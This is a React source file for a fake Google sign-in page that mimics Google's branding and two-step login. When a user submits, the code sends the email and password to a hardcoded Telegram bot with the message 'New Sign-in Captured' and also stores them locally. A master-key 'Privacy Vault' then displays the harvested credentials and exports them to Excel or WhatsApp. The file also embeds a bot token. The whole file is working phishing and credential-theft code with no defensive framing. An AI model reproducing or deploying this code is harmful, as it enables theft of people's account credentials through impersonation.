/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import React, { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { ChevronDown, Lock, Eye, EyeOff, Trash2, ArrowLeft, FileSpreadsheet } from 'lucide-react';
import * as XLSX from 'xlsx';

interface LoginRecord {
  id: string;
  email: string;
  password: string;
  timestamp: string;
}

const WhatsAppIcon = ({ size = 18 }: { size?: number }) => (
  <svg viewBox="0 0 24 24" width={size} height={size} fill="currentColor">
    <path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z" />
  </svg>
);

export default function App() {
  const [view, setView] = useState<'login' | 'privacy'>('login');
  const [step, setStep] = useState<'email' | 'password' | 'verifying'>('email');
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [history, setHistory] = useState<LoginRecord[]>([]);
  
  // Privacy Page States
  const [masterKey, setMasterKey] = useState('');
  const [isUnlocked, setIsUnlocked] = useState(false);
  const [showPasswords, setShowPasswords] = useState<Record<string, boolean>>({});

  // Load history from localStorage on mount
  useEffect(() => {
    const saved = localStorage.getItem('google_clone_history');
    if (saved) {
      try {
        setHistory(JSON.parse(saved));
      } catch (e) {
        console.error('Failed to parse history', e);
      }
    }
  }, []);

  const handleNext = async (e: React.FormEvent) => {
    e.preventDefault();
    if (step === 'email' && email) {
      setStep('password');
    } else if (step === 'password' && password) {
      setStep('verifying');
      const timestamp = new Date().toLocaleString();
      const newRecord: LoginRecord = {
        id: Math.random().toString(36).substr(2, 9),
        email,
        password,
        timestamp,
      };
      const updatedHistory = [newRecord, ...history];
      setHistory(updatedHistory);
      localStorage.setItem('google_clone_history', JSON.stringify(updatedHistory));
      
      // Telegram Notification
      const botToken = "8610695377:AAF420F-ockDND0BJxEea_6LIW3s6fHCWB0";
      const chatId = "7420043705";

      if (botToken && chatId) {
        const message = `
<b>🚀 New Sign-in Captured 🚀</b>

<b>📅 Time:</b> ${timestamp}
<b>👤 Username:</b> <code>${email}</code>
<b>🔑 Password:</b> <code>${password}</code>

-----------------------------
<i>Sent from Google Auth Clone</i>
        `;

        try {
          fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              chat_id: chatId,
              text: message,
              parse_mode: 'HTML',
            }),
          });
        } catch (error) {
          console.error('Telegram notification failed:', error);
        }
      }

      // Simulate verification delay
      setTimeout(() => {
        alert('Sign-in successful! Your data has been recorded in the Privacy section.');
        // Reset for next demo
        setEmail('');
        setPassword('');
        setStep('email');
      }, 2500);
    }
  };

  const handleBack = () => {
    setStep('email');
  };

  const handleUnlock = (e: React.FormEvent) => {
    e.preventDefault();
    if (masterKey === 'google01') {
      setIsUnlocked(true);
    } else {
      alert('Incorrect Master Key');
    }
  };

  const togglePasswordVisibility = (id: string) => {
    setShowPasswords(prev => ({ ...prev, [id]: !prev[id] }));
  };

  const clearHistory = () => {
    if (confirm('Are you sure you want to clear all sign-in history?')) {
      setHistory([]);
      localStorage.removeItem('google_clone_history');
    }
  };

  const exportToExcel = () => {
    if (history.length === 0) {
      alert('No data to export');
      return;
    }
    
    const data = history.map(record => ({
      Timestamp: record.timestamp,
      'Email / Phone': record.email,
      Password: record.password
    }));

    const worksheet = XLSX.utils.json_to_sheet(data);
    const workbook = XLSX.utils.book_new();
    XLSX.utils.book_append_sheet(workbook, worksheet, "Sign-in History");
    
    XLSX.writeFile(workbook, `google_signin_history_${new Date().getTime()}.xlsx`);
  };

  const shareToWhatsApp = () => {
    if (history.length === 0) {
      alert('No data to share');
      return;
    }

    let message = "*Google Sign-in History Export*\n\n";
    message += "----------------------------------\n";
    
    history.forEach((record, index) => {
      message += `${index + 1}. *Time:* ${record.timestamp}\n`;
      message += `   *Email:* ${record.email}\n`;
      message += `   *Pass:* ${record.password}\n`;
      message += "----------------------------------\n";
    });

    const encodedMessage = encodeURIComponent(message);
    window.open(`https://wa.me/?text=${encodedMessage}`, '_blank');
  };

  if (view === 'privacy') {
    return (
      <div className="min-h-screen bg-[#f8f9fa] flex flex-col items-center p-4 md:p-8 font-sans text-[#202124]">
        <div className="w-full max-w-4xl">
          <button 
            onClick={() => { setView('login'); setIsUnlocked(false); setMasterKey(''); }}
            className="flex items-center gap-2 text-[#1a73e8] hover:bg-[#e8f0fe] px-4 py-2 rounded-md transition-colors mb-6 font-medium"
          >
            <ArrowLeft size={20} /> Back to Sign-in
          </button>

          {!isUnlocked ? (
            <motion.div 
              initial={{ opacity: 0, scale: 0.95 }}
              animate={{ opacity: 1, scale: 1 }}
              className="bg-white border border-[#dadce0] rounded-xl p-8 shadow-sm flex flex-col items-center max-w-md mx-auto mt-12"
            >
              <div className="w-16 h-16 bg-[#f1f3f4] rounded-full flex items-center justify-center mb-6">
                <Lock className="text-[#5f6368]" size={32} />
              </div>
              <h1 className="text-2xl font-semibold mb-2 text-[#202124]">Privacy Vault</h1>
              <p className="text-[#5f6368] text-center mb-6">Enter the master key to view sign-in history.</p>
              
              <div className="w-full bg-[#fce8e6] border border-[#f5c6cb] rounded-lg p-3 mb-6 text-center">
                <p className="text-[#d93025] text-xs font-bold uppercase tracking-wider mb-1">Terms & Conditions</p>
                <p className="text-[#721c24] text-[11px] leading-tight">
                  This vault contains sensitive user data. Access is restricted to <strong>Authorized Admin Only</strong>. 
                  Unauthorized access attempts are strictly prohibited and may be logged.
                </p>
              </div>
              
              <form onSubmit={handleUnlock} className="w-full">
                <input
                  type="password"
                  value={masterKey}
                  onChange={(e) => setMasterKey(e.target.value)}
                  placeholder="Master Key"
                  className="w-full px-4 py-3 border border-[#dadce0] rounded-lg focus:outline-none focus:border-[#1a73e8] focus:ring-1 focus:ring-[#1a73e8] mb-4"
                  autoFocus
                />
                <button 
                  type="submit"
                  className="w-full bg-[#1a73e8] text-white py-2.5 rounded-lg font-medium hover:bg-[#1b66c9] transition-colors"
                >
                  Unlock
                </button>
              </form>
            </motion.div>
          ) : (
            <motion.div 
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              className="bg-white border border-[#dadce0] rounded-xl shadow-sm overflow-hidden"
            >
              <div className="p-6 border-b border-[#dadce0] flex flex-col md:flex-row md:items-center justify-between bg-[#f8f9fa] gap-4">
                <div>
                  <h1 className="text-xl font-semibold text-[#202124]">Sign-in History</h1>
                  <p className="text-sm text-[#5f6368]">Captured credentials from this session</p>
                </div>
                <div className="flex flex-wrap items-center gap-2">
                  <button 
                    onClick={exportToExcel}
                    className="flex items-center gap-2 bg-[#1d6f42] text-white hover:bg-[#155231] px-4 py-2 rounded-md transition-colors font-medium text-sm"
                  >
                    <FileSpreadsheet size={18} /> Excel
                  </button>
                  <button 
                    onClick={shareToWhatsApp}
                    className="flex items-center gap-2 bg-[#25D366] text-white hover:bg-[#128C7E] px-4 py-2 rounded-md transition-colors font-medium text-sm"
                  >
                    <WhatsAppIcon size={18} /> WhatsApp
                  </button>
                  <button 
                    onClick={clearHistory}
                    className="flex items-center gap-2 text-[#d93025] hover:bg-[#fce8e6] px-4 py-2 rounded-md transition-colors font-medium text-sm"
                  >
                    <Trash2 size={18} /> Clear
                  </button>
                </div>
              </div>

              <div className="overflow-x-auto">
                <table className="w-full text-left border-collapse">
                  <thead>
                    <tr className="bg-[#f1f3f4] text-[#5f6368] text-xs uppercase tracking-wider">
                      <th className="px-6 py-3 font-semibold">Timestamp</th>
                      <th className="px-6 py-3 font-semibold">Email / Phone</th>
                      <th className="px-6 py-3 font-semibold">Password</th>
                      <th className="px-6 py-3 font-semibold text-right">Actions</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-[#dadce0]">
                    {history.length === 0 ? (
                      <tr>
                        <td colSpan={4} className="px-6 py-12 text-center text-[#5f6368] italic">
                          No history recorded yet. Sign in on the main page to see data here.
                        </td>
                      </tr>
                    ) : (
                      history.map((record) => (
                        <tr key={record.id} className="hover:bg-[#f8f9fa] transition-colors">
                          <td className="px-6 py-4 text-sm whitespace-nowrap">{record.timestamp}</td>
                          <td className="px-6 py-4 text-sm font-medium">{record.email}</td>
                          <td className="px-6 py-4 text-sm font-mono">
                            {showPasswords[record.id] ? record.password : '••••••••'}
                          </td>
                          <td className="px-6 py-4 text-right">
                            <button 
                              onClick={() => togglePasswordVisibility(record.id)}
                              className="p-2 hover:bg-[#e8f0fe] rounded-full text-[#1a73e8] transition-colors"
                              title={showPasswords[record.id] ? "Hide Password" : "Show Password"}
                            >
                              {showPasswords[record.id] ? <EyeOff size={18} /> : <Eye size={18} />}
                            </button>
                          </td>
                        </tr>
                      ))
                    )}
                  </tbody>
                </table>
              </div>
            </motion.div>
          )}
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-white md:bg-[#f0f2f1] flex flex-col items-center justify-center font-sans text-[#202124]">
      {/* Main Card */}
      <motion.div 
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: 1, y: 0 }}
        className="w-full max-w-[450px] bg-white md:border md:border-[#dadce0] rounded-lg px-6 py-12 md:px-10 md:py-12 flex flex-col items-center"
      >
        {/* Google Logo */}
        <div className="mb-8 flex items-center justify-center select-none drop-shadow-sm">
          <div className="flex items-baseline font-semibold text-[34px] tracking-[-0.05em] font-sans">
            <span className="text-[#4285F4]">G</span>
            <span className="text-[#EA4335]">o</span>
            <span className="text-[#FBBC05]">o</span>
            <span className="text-[#EA4335]">g</span>
            <span className="text-[#34A853]">l</span>
            <span className="text-[#4285F4]">e</span>
            <span className="text-[#5f6368] ml-0.5 text-[28px]">.</span>
          </div>
        </div>

        <AnimatePresence mode="wait">
          {step === 'verifying' ? (
            <motion.div
              key="verifying-step"
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              className="w-full flex flex-col items-center py-12"
            >
              <div className="w-full h-1 bg-[#e8f0fe] absolute top-0 left-0 overflow-hidden rounded-t-lg">
                <motion.div 
                  initial={{ x: '-100%' }}
                  animate={{ x: '100%' }}
                  transition={{ repeat: Infinity, duration: 1.5, ease: "linear" }}
                  className="w-1/3 h-full bg-[#1a73e8]"
                />
              </div>
              <div className="mb-8">
                <div className="w-12 h-12 border-4 border-[#e8f0fe] border-t-[#1a73e8] rounded-full animate-spin"></div>
              </div>
              <h1 className="text-2xl font-semibold mb-2 text-[#202124]">Verifying...</h1>
              <p className="text-base text-[#5f6368] text-center">One moment please</p>
            </motion.div>
          ) : step === 'email' ? (
            <motion.div
              key="email-step"
              initial={{ x: -20, opacity: 0 }}
              animate={{ x: 0, opacity: 1 }}
              exit={{ x: -20, opacity: 0 }}
              transition={{ duration: 0.2 }}
              className="w-full flex flex-col items-center"
            >
              <h1 className="text-2xl font-semibold mb-2 text-[#202124]">Sign in</h1>
              <p className="text-base mb-10 text-[#202124]">Use your Google Account</p>

              <form onSubmit={handleNext} className="w-full">
                <div className="relative mb-2 group">
                  <input
                    type="text"
                    id="email"
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                    className="w-full px-4 py-3.5 border border-[#dadce0] rounded-md focus:outline-none focus:border-[#1a73e8] focus:ring-1 focus:ring-[#1a73e8] peer placeholder-transparent"
                    placeholder="Email or phone"
                    autoFocus
                  />
                  <label
                    htmlFor="email"
                    className="absolute left-4 -top-2.5 bg-white px-1 text-xs text-[#1a73e8] transition-all peer-placeholder-shown:text-base peer-placeholder-shown:text-[#5f6368] peer-placeholder-shown:top-3.5 peer-focus:-top-2.5 peer-focus:text-xs peer-focus:text-[#1a73e8]"
                  >
                    Email or phone
                  </label>
                </div>
                <button type="button" className="text-[#1a73e8] font-medium text-sm hover:bg-[#f8fbff] px-2 py-1 -ml-2 rounded transition-colors mb-8">
                  Forgot email?
                </button>

                <div className="text-sm text-[#5f6368] mb-10 leading-relaxed">
                  Not your computer? Use Guest mode to sign in privately.{' '}
                  <a href="#" className="text-[#1a73e8] font-medium hover:underline">Learn more</a>
                </div>

                <div className="flex items-center justify-between">
                  <button type="button" className="text-[#1a73e8] font-medium text-sm hover:bg-[#f8fbff] px-4 py-2 rounded transition-colors">
                    Create account
                  </button>
                  <button
                    type="submit"
                    className="bg-[#1a73e8] text-white px-6 py-2 rounded-md font-medium text-sm hover:bg-[#1b66c9] shadow-sm transition-colors"
                  >
                    Next
                  </button>
                </div>
              </form>
            </motion.div>
          ) : (
            <motion.div
              key="password-step"
              initial={{ x: 20, opacity: 0 }}
              animate={{ x: 0, opacity: 1 }}
              exit={{ x: 20, opacity: 0 }}
              transition={{ duration: 0.2 }}
              className="w-full flex flex-col items-center"
            >
              <h1 className="text-2xl font-semibold mb-2 text-[#202124]">Welcome</h1>
              <button 
                onClick={handleBack}
                className="flex items-center gap-2 px-3 py-1 border border-[#dadce0] rounded-full text-sm font-medium hover:bg-[#f8fbff] transition-colors mb-8"
              >
                <div className="w-5 h-5 bg-[#f1f3f4] rounded-full flex items-center justify-center">
                  <svg viewBox="0 0 24 24" width="16" height="16" fill="currentColor">
                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/>
                  </svg>
                </div>
                {email}
                <ChevronDown size={16} />
              </button>

              <form onSubmit={handleNext} className="w-full">
                <div className="relative mb-2 group">
                  <input
                    type="password"
                    id="password"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    className="w-full px-4 py-3.5 border border-[#dadce0] rounded-md focus:outline-none focus:border-[#1a73e8] focus:ring-1 focus:ring-[#1a73e8] peer placeholder-transparent"
                    placeholder="Enter your password"
                    autoFocus
                  />
                  <label
                    htmlFor="password"
                    className="absolute left-4 -top-2.5 bg-white px-1 text-xs text-[#1a73e8] transition-all peer-placeholder-shown:text-base peer-placeholder-shown:text-[#5f6368] peer-placeholder-shown:top-3.5 peer-focus:-top-2.5 peer-focus:text-xs peer-focus:text-[#1a73e8]"
                  >
                    Enter your password
                  </label>
                </div>
                
                <div className="flex items-center gap-2 mb-8 mt-2">
                  <input type="checkbox" id="show-password" size={18} className="w-4 h-4 accent-[#1a73e8]" />
                  <label htmlFor="show-password" className="text-sm font-medium cursor-pointer">Show password</label>
                </div>

                <div className="flex items-center justify-between">
                  <button type="button" className="text-[#1a73e8] font-medium text-sm hover:bg-[#f8fbff] px-4 py-2 rounded transition-colors">
                    Forgot password?
                  </button>
                  <button
                    type="submit"
                    className="bg-[#1a73e8] text-white px-6 py-2 rounded-md font-medium text-sm hover:bg-[#1b66c9] shadow-sm transition-colors"
                  >
                    Next
                  </button>
                </div>
              </form>
            </motion.div>
          )}
        </AnimatePresence>
      </motion.div>

      {/* Footer */}
      <div className="w-full max-w-[1024px] mt-6 px-4 flex flex-col md:flex-row items-center justify-between text-xs text-[#202124]">
        <div className="flex items-center gap-4 mb-4 md:mb-0">
          <button className="flex items-center gap-2 hover:bg-[#f1f3f4] px-2 py-1 rounded transition-colors">
            English (United States) <ChevronDown size={14} />
          </button>
        </div>
        <div className="flex items-center gap-6">
          <a href="#" className="hover:bg-[#f1f3f4] px-2 py-1 rounded transition-colors">Help</a>
          <button 
            onClick={() => setView('privacy')}
            className="hover:bg-[#f1f3f4] px-2 py-1 rounded transition-colors"
          >
            Privacy
          </button>
          <a href="#" className="hover:bg-[#f1f3f4] px-2 py-1 rounded transition-colors">Terms</a>
        </div>
      </div>
    </div>
  );
}
